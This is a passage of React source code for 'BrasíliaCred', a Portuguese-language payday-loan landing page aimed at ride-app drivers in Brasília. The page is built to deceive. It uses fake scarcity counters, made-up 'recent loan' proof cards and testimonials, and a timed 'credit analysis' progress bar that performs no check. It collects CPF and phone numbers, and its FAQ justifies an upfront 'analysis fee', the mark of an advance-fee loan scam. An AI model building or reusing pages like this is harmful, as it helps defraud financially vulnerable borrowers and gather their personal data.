      <div className="urgency-bar">
        ⚡ OFERTA LIMITADA &mdash; Restam apenas <strong>{vagasHoje} vagas</strong> hoje!
      </div>

      {/* Nav mínimo */}
      <header className="oferta-nav">
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <div className="logo-icon">$</div>
          <span style={{ fontSize: 18, fontWeight: 700, color: "#1e293b" }}>
            Brasília<span style={{ color: "#f59e0b" }}>Cred</span>
          </span>
        </div>
        <button onClick={scrollParaForm} className="btn-small">
          Quero meu crédito →
        </button>
      </header>

      {/* Hero */}
      <section className="hero-section">
        <div style={{ maxWidth: 600, margin: "0 auto", padding: "0 1rem" }}>
          <div className="badge badge-blue" style={{ marginBottom: 16 }}>
            👥 {atendidosHoje} motoristas atendidos hoje
          </div>

          <h1 className="hero-title">
            Empréstimo <span className="text-gradient">pré-aprovado</span> para motoristas de app
          </h1>

          <p className="hero-subtitle">
            De <strong style={{ color: "#f59e0b" }}>R$ 200 a R$ 5.000</strong> liberados em até 30 minutos.
            Sem fiador, sem burocracia, direto no seu PIX.
          </p>

          <button onClick={scrollParaSimulador} className="btn-primary btn-lg" style={{ marginBottom: 24 }}>
            Simular meu empréstimo →
          </button>

          <div className="trust-row">
            <span>🛡️ 100% Seguro</span>
            <span>⏱️ Aprovação em 30 min</span>
            <span>⚡ Dinheiro via PIX</span>
          </div>
        </div>
      </section>

      {/* Prints de empréstimos realizados */}
      <section style={{ padding: "24px 0", background: "#f0fdf4", borderTop: "1px solid #bbf7d0", borderBottom: "1px solid #bbf7d0" }}>
        <div style={{ maxWidth: 700, margin: "0 auto", padding: "0 1rem" }}>
          <div style={{ textAlign: "center", marginBottom: 14 }}>
            <span style={{ fontSize: 13, fontWeight: 700, color: "#166534" }}>
              📱 Empréstimos liberados recentemente via PIX
            </span>
          </div>
          <div className="proof-scroll">
            {/* PLACEHOLDER: substitua por imagens reais quando o usuário enviar */}
            {[
              { nome: "Marcos", valor: "R$ 1.200", tempo: "há 15 min" },
              { nome: "Juliana", valor: "R$ 800", tempo: "há 45 min" },
              { nome: "Carlos", valor: "R$ 3.000", tempo: "há 1h" },
              { nome: "Ana", valor: "R$ 500", tempo: "há 2h" },
            ].map((p) => (
              <div key={p.nome} className="proof-card">
                <div className="proof-img-placeholder">📸</div>
                <div style={{ fontSize: 11, color: "#475569", fontWeight: 600 }}>{p.nome} recebeu</div>
                <div style={{ fontSize: 15, color: "#16a34a", fontWeight: 800 }}>{p.valor}</div>
                <div style={{ fontSize: 10, color: "#94a3b8" }}>{p.tempo}</div>
              </div>
            ))}
          </div>
          <p style={{ textAlign: "center", color: "#6b7280", fontSize: 11, marginTop: 10, fontStyle: "italic" }}>
            * Prints reais serão adicionados aqui
          </p>
        </div>
      </section>

      {/* Números */}
      <section className="stats-bar">
        <div className="stats-grid">
          <div>
            <div className="stat-number" style={{ color: "#f59e0b" }}>+800</div>
            <div className="stat-label">Motoristas atendidos</div>
          </div>
          <div>
            <div className="stat-number" style={{ color: "#3b82f6" }}>30 min</div>
            <div className="stat-label">Tempo de aprovação</div>
          </div>
          <div>
            <div className="stat-number" style={{ color: "#1e293b" }}>4.9 ★</div>
            <div className="stat-label">Avaliação dos clientes</div>
          </div>
        </div>
      </section>

      {/* Depoimentos */}
      <section className="section-gray">
        <div style={{ maxWidth: 700, margin: "0 auto", padding: "0 1rem" }}>
          <h3 className="section-title" style={{ fontSize: "1.25rem" }}>
            O que motoristas dizem sobre nós
          </h3>
          <div className="testimonials-grid">
            {[
              { nome: "Carlos S.", cidade: "Asa Sul", texto: "Em menos de 1 hora tava com o dinheiro. Me salvou quando meu carro quebrou!" },
              { nome: "Ana Paula R.", cidade: "Taguatinga", texto: "Já peguei 3 vezes, sempre tudo certinho. Recomendo pra todo motorista." },
              { nome: "Roberto M.", cidade: "Ceilândia", texto: "Atendimento pelo WhatsApp excelente. Tudo explicado, sem surpresa." },
            ].map((t) => (
              <div key={t.nome} className="testimonial-card">
                <div className="stars">★★★★★</div>
                <p className="testimonial-text">&ldquo;{t.texto}&rdquo;</p>
                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                  <div className="avatar">{t.nome[0]}</div>
                  <div>
                    <div style={{ fontWeight: 600, fontSize: 13, color: "#1e293b" }}>{t.nome}</div>
                    <div style={{ fontSize: 11, color: "#94a3b8" }}>Motorista &middot; {t.cidade}</div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Simulador */}
      <section className="section-white" id="simulador" ref={simulatorRef}>
        <div style={{ maxWidth: 480, margin: "0 auto", padding: "0 1rem" }}>
          <h2 className="section-title">
            Simule seu <span style={{ color: "#f59e0b" }}>empréstimo</span>
          </h2>
          <p className="section-subtitle">Veja quanto vai pagar e solicite na hora</p>

          <div className="simulator-card">
            <label className="field-label">Quanto você precisa?</label>
            <div className="sim-value">R$ {fmtBRL(dados.valorEmprestimo)}</div>
            <input
              type="range"
              min={200}
              max={5000}
              step={50}
              value={dados.valorEmprestimo}
              onChange={(e) => setDados((d) => ({ ...d, valorEmprestimo: Number(e.target.value) }))}
              className="range-input"
            />
            <div className="range-labels">
              <span>R$ 200</span>
              <span>R$ 5.000</span>
            </div>

            <label className="field-label" style={{ marginTop: 20 }}>Como quer pagar?</label>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
              <button
                onClick={() => setDados((d) => ({ ...d, tipoEmprestimo: "SEMANAL" }))}
                className={`tipo-btn ${dados.tipoEmprestimo === "SEMANAL" ? "tipo-btn-active" : ""}`}
              >
                <strong>Semanal</strong>
                <small>20% de juros &middot; 7 dias</small>
              </button>
              <button
                onClick={() => setDados((d) => ({ ...d, tipoEmprestimo: "QUINZENAL" }))}
                className={`tipo-btn ${dados.tipoEmprestimo === "QUINZENAL" ? "tipo-btn-active" : ""}`}
              >
                <strong>Quinzenal</strong>
                <small>30% de juros &middot; 15 dias</small>
              </button>
            </div>

            <div className="sim-result">
              <div className="sim-result-item">
                <span className="sim-result-label">Emprestado</span>
                <span className="sim-result-value">R$ {fmtBRL(dados.valorEmprestimo)}</span>
              </div>
              <div className="sim-result-item">
                <span className="sim-result-label">📈 Juros</span>
                <span className="sim-result-value" style={{ color: "#f59e0b" }}>
                  R$ {fmtBRL(valorJuros, 2)}
                </span>
              </div>
              <div className="sim-result-item">
                <span className="sim-result-label">Total a pagar</span>
                <span className="sim-result-value" style={{ color: "#16a34a", fontWeight: 800 }}>
                  R$ {fmtBRL(valorTotal, 2)}
                </span>
              </div>
            </div>

            <button
              onClick={() => {
                setEtapa("formulario");
                setTimeout(() => formRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
              }}
              className="btn-primary btn-lg"
              style={{ width: "100%", marginTop: 8 }}
            >
              Solicitar pré-aprovação grátis
            </button>
            <p className="secure-text">🔒 Seus dados estão protegidos</p>
          </div>
        </div>
      </section>

      {/* Formulário */}
      <section ref={formRef} className="section-white" id="formulario">
        <div style={{ maxWidth: 420, margin: "0 auto", padding: "0 1rem" }}>
          {etapa === "formulario" ? (
            <>
              <div style={{ textAlign: "center", marginBottom: 24 }}>
                <span className="badge badge-amber">⚡ Pré-aprovação gratuita</span>
                <h2 style={{ fontSize: "1.5rem", fontWeight: 700, color: "#1e293b", marginTop: 12, marginBottom: 8 }}>
                  Preencha para verificar sua elegibilidade
                </h2>
                <p style={{ color: "#94a3b8", fontSize: 14 }}>Resposta em até 30 segundos &mdash; sem compromisso</p>
              </div>

              <div className="form-card">
                <div className="form-group">
                  <label className="field-label">Nome completo</label>
                  <input
                    type="text"
                    value={dados.nome}
                    onChange={(e) => setDados((d) => ({ ...d, nome: e.target.value }))}
                    placeholder="Seu nome completo"
                    className="form-input"
                  />
                </div>
                <div className="form-group">
                  <label className="field-label">Telefone (WhatsApp)</label>
                  <input
                    type="tel"
                    value={dados.telefone}
                    onChange={(e) => setDados((d) => ({ ...d, telefone: formatarTelefone(e.target.value) }))}
                    placeholder="(61) 99999-9999"
                    className="form-input"
                  />
                </div>
                <div className="form-group">
                  <label className="field-label">CPF</label>
                  <input
                    type="text"
                    value={dados.cpf}
                    onChange={(e) => setDados((d) => ({ ...d, cpf: formatarCPF(e.target.value) }))}
                    placeholder="000.000.000-00"
                    className="form-input"
                  />
                </div>

                {erroForm && (
                  <div className="error-msg">⚠️ {erroForm}</div>
                )}

                <div className="form-summary">
                  <div style={{ color: "#94a3b8", fontSize: 12 }}>Empréstimo solicitado</div>
                  <div style={{ fontSize: "1.25rem", fontWeight: 800, color: "#f59e0b" }}>
                    R$ {fmtBRL(dados.valorEmprestimo)}
                  </div>
                  <div style={{ color: "#94a3b8", fontSize: 12 }}>
                    {dados.tipoEmprestimo === "SEMANAL" ? "Semanal" : "Quinzenal"} &middot; Juros de {(taxaJuros * 100).toFixed(0)}%
                  </div>
                </div>

                <button onClick={handleSubmitForm} className="btn-primary btn-lg" style={{ width: "100%" }}>
                  Verificar minha pré-aprovação
                </button>
                <p className="secure-text">🔒 Dados criptografados e protegidos</p>
              </div>
            </>
          ) : (
            <div style={{ textAlign: "center", padding: "2rem 0" }}>
              <h2 style={{ fontSize: "1.5rem", fontWeight: 700, color: "#1e293b", marginBottom: 12 }}>
                Pronto para receber seu <span style={{ color: "#f59e0b" }}>crédito</span>?
              </h2>
              <p style={{ color: "#94a3b8", marginBottom: 24 }}>
                Preencha seus dados e descubra seu limite em segundos
              </p>
              <button
                onClick={() => {
                  setEtapa("formulario");
                  setTimeout(() => formRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
                }}
                className="btn-primary btn-lg"
              >
                Solicitar pré-aprovação grátis →
              </button>
            </div>
          )}
        </div>
      </section>

      {/* FAQ */}
      <section className="section-gray">
        <div style={{ maxWidth: 520, margin: "0 auto", padding: "0 1rem" }}>
          <h3 className="section-title" style={{ fontSize: "1.25rem" }}>Dúvidas frequentes</h3>
          <FAQCompacto />
        </div>
      </section>

      {/* Footer */}
      <footer style={{ padding: "24px 16px", textAlign: "center", borderTop: "1px solid #e2e8f0" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 8 }}>
          <div className="logo-icon-sm">$</div>
          <span style={{ fontSize: 14, fontWeight: 700, color: "#1e293b" }}>
            Brasília<span style={{ color: "#f59e0b" }}>Cred</span>
          </span>
        </div>
        <p style={{ color: "#94a3b8", fontSize: 11 }}>
          &copy; 2026 BrasíliaCred &middot; Brasília - DF
        </p>
      </footer>
      {estilos}
    </div>
  );
}

function AnaliseProgressBar({ totalMs }: { totalMs: number }) {
  const [pct, setPct] = useState(0);
  useEffect(() => {
    const start = Date.now();
    const interval = setInterval(() => {
      const elapsed = Date.now() - start;
      const p = Math.min(Math.round((elapsed / totalMs) * 100), 99);
      setPct(p);
      if (p >= 99) clearInterval(interval);
    }, 200);
    return () => clearInterval(interval);
  }, [totalMs]);
  return (
    <div>
      <div style={{ display: "flex", justifyContent: "space-between", fontSize: 12, color: "#64748b", marginBottom: 6 }}>
        <span>Progresso da análise</span>
        <span style={{ fontWeight: 700, color: "#f59e0b" }}>{pct}%</span>
      </div>
      <div style={{ background: "#e2e8f0", borderRadius: 99, height: 8, overflow: "hidden" }}>
        <div style={{ height: "100%", background: "linear-gradient(90deg, #f59e0b, #f97316)", borderRadius: 99, width: `${pct}%`, transition: "width 0.2s ease" }} />
      </div>
    </div>
  );
}

function AnaliseStep({ label, delay }: { label: string; delay: number }) {
  const [done, setDone] = useState(false);
  useEffect(() => {
    const timer = setTimeout(() => setDone(true), delay + 800);
    return () => clearTimeout(timer);
  }, [delay]);

  return (
    <div className="anim-fade-up" style={{ display: "flex", alignItems: "center", gap: 12, animationDelay: `${delay}ms` }}>
      {done ? (
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
      ) : (
        <div className="spinner-small" />
      )}
      <span style={{ fontSize: 14, color: done ? "#475569" : "#94a3b8" }}>{label}</span>
    </div>
  );
}

function FAQCompacto() {
  const [open, setOpen] = useState<number | null>(null);
  const items = [
    { q: "Quem pode solicitar?", a: "Motoristas de Uber, 99, InDriver ou qualquer app de transporte que atuem em Brasília/DF." },
    { q: "Quanto tempo para receber?", a: "Após aprovação, o dinheiro é liberado em até 30 minutos via PIX ou em mãos." },
    { q: "Preciso de fiador?", a: "Não! O empréstimo é baseado no seu perfil como motorista. Sem fiador e sem garantias." },
    { q: "Por que existe uma taxa de análise?", a: "A taxa cobre a consulta de crédito personalizada, garante atendimento prioritário com consultor dedicado e agiliza a liberação do seu empréstimo." },
  ];

  return (
    <div style={{ marginTop: 20 }}>
      {items.map((item, i) => (
        <div key={i} className="faq-item">
          <button className="faq-btn" onClick={() => setOpen(open === i ? null : i)}>
            <span style={{ paddingRight: 16 }}>{item.q}</span>
            <span className={`faq-arrow ${open === i ? "faq-arrow-open" : ""}`}>▼</span>
          </button>
          {open === i && <div className="faq-answer">{item.a}</div>}
        </div>
      ))}
    </div>
  );
}
